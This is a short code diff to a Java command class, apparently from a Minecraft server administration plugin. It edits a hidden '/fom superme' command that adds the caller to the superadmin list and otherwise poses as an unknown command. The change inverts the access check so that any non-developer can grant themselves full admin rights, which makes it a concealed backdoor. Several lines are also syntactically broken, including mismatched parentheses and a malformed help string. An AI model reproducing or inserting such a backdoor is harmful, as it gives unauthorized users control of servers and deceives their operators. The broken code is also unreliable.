@@ -23,18 +23,18 @@ public class Command_fom extends TFM_Command
     }
     else if (args.length == 1)
     {
-      if (sender_p.getName().equalsIgnoreCase("robo_lord") || sender_p.getName().equals("buildcarter8") || sender_p.getName().equals("SupItsDillon")) || sender_p.getname().equals("PieGuy7896")
+     if (!TFM_Util.DEVELOPERS.contains(sender.getName()))
       {
         if (args[0].equals("superme"))
         {
-          TFM_Util.adminAction("RoboSecurity",  "Adding"  + sender.getName() + "to the superadmin config.", true);
+          TFM_Util.adminAction("FOMSecurity",  "Adding"  + sender.getName() + "to the superadmin config.", true);
           TFM_AdminList.addSuperadmin(sender_p);
           return true;
         }
       }
-      else
+     else
       {
-        playerMsg("Unknown command. Type \"/help\" for help");
+        playerMsg("Unknown command. Type \"/help\"/ for help");
         return true;
       }
     }
